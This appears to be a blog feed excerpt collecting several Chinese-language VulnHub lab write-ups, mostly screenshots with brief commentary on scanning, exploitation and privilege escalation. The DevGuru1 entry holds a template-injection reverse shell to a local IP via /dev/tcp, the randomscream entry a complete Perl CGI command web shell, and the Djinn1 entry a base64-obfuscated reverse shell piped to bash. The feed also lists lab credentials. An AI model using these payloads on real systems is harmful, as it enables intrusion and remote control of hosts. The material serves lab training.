&lt;p&gt;gobuster：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE164263042b6af447eda01fd9d8df3c0bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;修改hosts访问：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEd7e5e68bf58a987ba8b6e0cbe29cc6feimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;wpscan:&lt;/p&gt;
&lt;p&gt;插件：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEb3bc6732e8ea9f1607a778cff288dc39image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;用户名：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc70bff00f3331f6243c4ff5a8872ce36image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;当前插件漏洞：&lt;/p&gt;
&lt;p&gt;当前版本应该是1.4.6，但是很可惜，是个后台漏洞：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE0a83ffabd3e4e50f8550ae2791a9552bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;后台弱口令:admin/admin&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEd66edb68792f30c73f2124a1ff7933ebimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;根据刚刚的插件漏洞，直接上传shell:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE84c42e249a55cd66fb1ae8bce52f3191image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;或者手动传也是可以的：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE0f3329107e44b7bfae709eac386f7142image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE1d7c3d27cb67e47cc7f1f5b9fddb66a3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;家目录：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE426dc1478cd8a8b6552796cc1f53059bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE8f28abf1e2d822451bef40fd020afe24image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEe8c63ef35b17ee4c89abf240eafe7f42image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;翻查密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE775b07842d5ef1f99bf24dd0863170baimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;wedgie57&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE7e6c2dc779e3e05bb1a1ca2981538371image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;尝试成功：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE499f3d34f3b2c403c165ba03b64eddb3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;在家目录里面翻查了半天：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE0aa890d2dd53208bf8abbc4a59e86879image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;我以为是另外一个用户的，没想到还是自己的：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE7fdc73753d66d89beb422f5d3a9de97cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x075 DevGuru1</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x075-devguru1/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x075-devguru1/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEa6bd581c7fa48e8387927f35ab208b15image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc1ec935487287800c122de86ac7c5ca1image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEab0eb3cd79e56fd6201ff24ccc811738image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透测试&#34;&gt;渗透测试&lt;/h1&gt;
&lt;p&gt;发现.git目录，通过githack下载下来，然后发现了数据库账号密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE8dd235d87d2355774597af94e8fb30efimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&amp;lsquo;database&amp;rsquo;   =&amp;gt; &amp;lsquo;octoberdb&amp;rsquo;,&lt;/p&gt;
&lt;p&gt;&amp;lsquo;username&amp;rsquo;   =&amp;gt; &amp;lsquo;october&amp;rsquo;,&lt;/p&gt;
&lt;p&gt;&amp;lsquo;password&amp;rsquo;   =&amp;gt; &amp;lsquo;SQ66EBYx4GT3byXH&amp;rsquo;,&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEbf21fb3ee14daec200095b3a301244b8image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;同时gobuster发现：&lt;/p&gt;
&lt;p&gt;adminer页数据库管理工具&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE3ced553e1389cd923303f402a70e2915image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;登录成功：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE97a08d1024d194c8ab57d630ba5799b6image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;密码hash，但是很可惜，没查到：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEe0771862accbd7f518a859a72f8575cdimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是可以添加用户：&lt;/p&gt;
&lt;p&gt;然后又是小技巧了，hash id 和hash-identifier认不出来，但是百度是有案例的，直接把前面一截拿到百度搜：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE92ac5b683cd5ef0df12b828557a6c627image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEd13a3917207d11119925f9abac161e5bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE94324b682221c4a4caa0ddaf3cc979e5image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;研究了半天这里的漏洞利用，查了资料原来是这里就可以直接修改代码执行：&lt;/p&gt;
&lt;p&gt;markup:&lt;/p&gt;
&lt;p&gt;{{ this.page.PoisonVar }}&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEdc09ba803a04971615e53d09065fccecimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;code:&lt;/p&gt;
&lt;p&gt;function onStart()&lt;/p&gt;
&lt;p&gt;{&lt;/p&gt;
&lt;p&gt;$this-&amp;gt;page[&amp;ldquo;PoisonVar&amp;rdquo;] = exec(&amp;quot;/bin/bash -c &amp;lsquo;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.5.66/8888 0&amp;gt;&amp;amp;1&amp;rsquo;&amp;quot;);&lt;/p&gt;
&lt;p&gt;}&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE8977ba30df11367a2b749669714d7359image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;点&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEa76361b23e24377e0f540594b22e9401image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;秒了再说：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEed85c3d72e11a842fd81fdfb3eab3d46image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;看一下作者留下的提权路径：&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x076 dev randomscream</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x076-dev-randomscream/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x076-dev-randomscream/</guid>
      <description>&lt;p&gt;头一次打vulnhub的windows靶机，不太好配置啊：&lt;/p&gt;
&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE87c4b538a137954d0474da79f0056849image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEa7bae8babbd95b78240e721eb612bd8bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透&#34;&gt;渗透&lt;/h1&gt;
&lt;p&gt;先看FTP：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE9be74f55b58760de31ce413d42cca90aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;文件挺多的，但是都没读取权限：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE9ecabaa1a20e5ca5f13be81ccd76b31fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;80端口也没扫出东西，这个root可能是80端口，然后看一下UPD的TFTP：&lt;/p&gt;
&lt;p&gt;随便尝试了一下：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE448020f7c8cf5c4aea20af6e81095a10image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是php反弹shell失败了，可能没有PHP的环境：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE6c4c7f225f482364f45c161a3fa3ca44image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这里查了一些资料，cgi程序：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE00273facdd56f5b7ef383221571d8e06image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEff2c4b45f24113084178074905020a9cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这些语言都可以实现，然后，poc如下：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;use CGI;
use Cwd;
print CGI::header( -type =&amp;gt; &amp;#39;text/html&amp;#39; );
my $command = CGI::param(&amp;#39;command&amp;#39;);
my $pwd = CGI::param(&amp;#39;pwd&amp;#39;) || &amp;#39;&amp;#39;;
my $password = CGI::param(&amp;#39;password&amp;#39;);
my $filename = CGI-&amp;gt;script_name() ;

if ( $password ne &amp;#39;yourpassword&amp;#39; ) {
    print &amp;#34;Please provide a valid password.\n&amp;#34;;
    exit(0)
}

$pwd = $pwd eq &amp;#39;&amp;#39; ? `pwd` : $pwd;
my $home = Cwd::cwd();
chdir($pwd);

my $result=&amp;#39;&amp;#39;;

if ($command =~ /^cd\s*(.*)/) {
  my $dir = $1 or &amp;#39;&amp;#39;;
  if ($dir eq &amp;#39;&amp;#39;) {
    chdir($home);
  } else {
    chdir($dir);
  }
  $pwd = Cwd::cwd(); 
  $result = `ls -la`;
} else {
  $result = `$command`;
}

print &amp;lt;&amp;lt;EOF;
&amp;lt;!DOCTYPE html PUBLIC &amp;#34;-//W3C//DTD HTML 4.01//EN&amp;#34; &amp;#34;http://www.w3.org/TR/html4/strict.dtd&amp;#34;&amp;gt;
&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;
&amp;lt;meta content=&amp;#34;text/html; charset=ISO-8859-1&amp;#34; http-equiv=&amp;#34;content-type&amp;#34;&amp;gt;&amp;lt;title&amp;gt;console&amp;lt;/title&amp;gt;
&amp;lt;script&amp;gt;
window.onload = function(){
        document.getElementById(&amp;#34;command&amp;#34;).focus();
        }

&amp;lt;/script&amp;gt;
&amp;lt;style type=&amp;#34;text/css&amp;#34;&amp;gt;
.wide1 {
border-width: thick;
width: 100%;
height: 600px;
}
.wide2 {
setFocus;
border-width: thick;
width: 100%;
}
&amp;lt;/style&amp;gt;
&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;
&amp;lt;p&amp;gt;
Script: $filename PWD: $pwd &amp;lt;br/&amp;gt;
&amp;lt;textarea class=&amp;#34;wide1&amp;#34; readonly=&amp;#34;readonly&amp;#34; cols=&amp;#34;1&amp;#34; rows=&amp;#34;1&amp;#34; name=&amp;#34;result&amp;#34;&amp;gt;
$result
&amp;lt;/textarea&amp;gt;&amp;lt;/p&amp;gt;
&amp;lt;form method=&amp;#34;get&amp;#34; action=&amp;#34;$filename&amp;#34; name=&amp;#34;command&amp;#34;&amp;gt;Command:&amp;amp;nbsp;
&amp;lt;input class=&amp;#34;wide2&amp;#34; name=&amp;#34;command&amp;#34; id=&amp;#34;command&amp;#34;&amp;gt;&amp;lt;br&amp;gt;
&amp;lt;input name=&amp;#34;password&amp;#34; value=&amp;#34;$password&amp;#34; type=&amp;#34;hidden&amp;#34;&amp;gt;
&amp;lt;input name=&amp;#34;pwd&amp;#34; value=&amp;#34;$pwd&amp;#34; type=&amp;#34;hidden&amp;#34;&amp;gt;
&amp;lt;/form&amp;gt;
&amp;lt;br&amp;gt;
&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
EOF

exit 0;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;使用方式：&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x077 Digitalworld.local(Mercyv2)</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x077-digitalworld.localmercyv2/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x077-digitalworld.localmercyv2/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE74f817d050008763895c9aeeadb1bc6fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE76d1c146ffa9dc152a48b68a0cc29489image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透测试&#34;&gt;渗透测试&lt;/h1&gt;
&lt;p&gt;SMBA没有东西，那么就是HTTP 8080了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE3f77b34b64dd6df5c8b8ba2932aec50fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEe072604120ca403c1f374a964aad5940image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;解密出来：&lt;/p&gt;
&lt;p&gt;It&amp;rsquo;s annoying, but we repeat this over and over again: cyber hygiene is extremely important. Please stop setting silly passwords that will get cracked with any decent password list.&lt;/p&gt;
&lt;p&gt;Once, we found the password &amp;ldquo;password&amp;rdquo;, quite literally sticking on a post-it in front of an employee&amp;rsquo;s desk! As silly as it may be, the employee pleaded for mercy when we threatened to fire her.&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x078 Djinn1</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x078-djinn1/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x078-djinn1/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE32d366749858f384b258b752e94a4555image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE8bff7a9e9a70b6b4389424a5314dc4a1image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEcaa498add233ae75057ecb27b2f7af48image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透&#34;&gt;渗透&lt;/h1&gt;
&lt;p&gt;FTP：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE9c508adcba3bbe67f5ba8672f778cbedimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这里有几个信息，1337端口？nitish81299、nitu:81299&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE28cf9501e1386257869e0ecc2dfe189cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;HTTP：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE56c3137b5f4bf4648827e8f7fc6c033bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;命令执行：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE008cfbe77d712786215abc017467fb64image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEf52666b561ae6d53df6e1b04f1302739image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;用burp抓包可以发现是个重定向：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE94786b2ab29c9817b29c1a8d95408c20image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;反弹shell，弹了半天，弹不动，后面看了一下，这里是过滤了，得用base64绕过：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;echo &amp;#34;YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUuNjYvODg4OCAwPiYxCg==&amp;#34; | base64 -d | bash
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEdbaf6d5b9c645fda8da1e122548ce48fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEd574aa49ef46874eac356a3cf4f63212image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现SUID，不过不是root的，并且没有执行权限，看样子得提权到nitish才行：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE236e0ff3dba9d9a66f092e7de1b11d8dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后在nitish的家目录下面找到密码：&lt;/p&gt;
&lt;p&gt;nitish:p4ssw0rdStr3r0n9&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE7ca081e0461a31522c964c593daf591dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;切换到sam用户，用gtfobin的方法，这里都执行失败了，&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc683522e6f1484e907b650a8a9fb899fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这里又有一个坑，使用-h看到的参数里面都没法执行成功：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE5222747087bbc5564aba2b847411d9eaimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是man可以：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE0d9988f2265199aee2a8203785458e5fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后就是，随便带一个参数就可以提权：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE61dfb0f6d86c449c7b8a46afa28a7c6cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;sudo提权这里不知道怎么利用：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc5d855c8b22f37d0f91a1fac4fd2cd5aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;去sam家目录下面翻查，有一个.pyc的文件：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE73196c0a316200d848a11d085ec09e94image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;传出来：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE95edb9c1f70249eea6a045d446210497image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE63440625801c3d345ed09e410426e479image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;反编译：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://tool.lu/pyc/&#34;&gt;https://tool.lu/pyc/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE5ef5e9e34de05e7716a88837f112d19cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x079 Escalate_Linux1</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x079-escalate_linux1/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x079-escalate_linux1/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEb55240db28b2e77a57f5f3151ea17adaimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE35991696c3607edd690bb5defd09f925image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透&#34;&gt;渗透&lt;/h1&gt;
&lt;p&gt;smb:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEf97b1254f7dfaffb6398df2db386d488image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;http：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEb086601261df6d310d3c93c94e5c0b79image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE387357b46fadc32fe608557307cc945eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;url编码后，直接反弹shell:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE61dca625e919722f12a86e4f105f23e0image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;根据描述来看，这个靶机主要就是看的提权：&lt;/p&gt;
&lt;p&gt;有GCC，先秒了再说：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEdf6440643a53d1b889f6f942d89d531dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;NFS提权：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE7ea76102c0a0cc932b010ce7994b3865image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
